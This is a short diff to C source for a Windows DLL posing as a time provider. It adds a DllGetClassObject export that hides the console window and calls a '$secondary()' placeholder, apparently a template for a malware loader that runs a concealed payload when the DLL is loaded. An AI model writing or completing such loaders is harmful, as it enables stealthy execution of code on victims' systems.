@@ -99,6 +99,13 @@ EXPORT HRESULT WINAPI TimeProvClose(TimeProvHandle p) {
 EXPORT HRESULT WINAPI RegisterModule(DWORD v, void* m, void* g) {
     return 0;
 }
+EXPORT HRESULT WINAPI DllGetClassObject(void* x, void *i, void* p) {
+    HANDLE c = GetConsoleWindow();
+    if (c != NULL) {
+        ShowWindow(c, 0);
+    }
+    $secondary();
+}
 EXPORT HRESULT WINAPI TimeProvCommand(TimeProvHandle h, TimeProvCmd c, PVOID a) {
     return 0;
 }
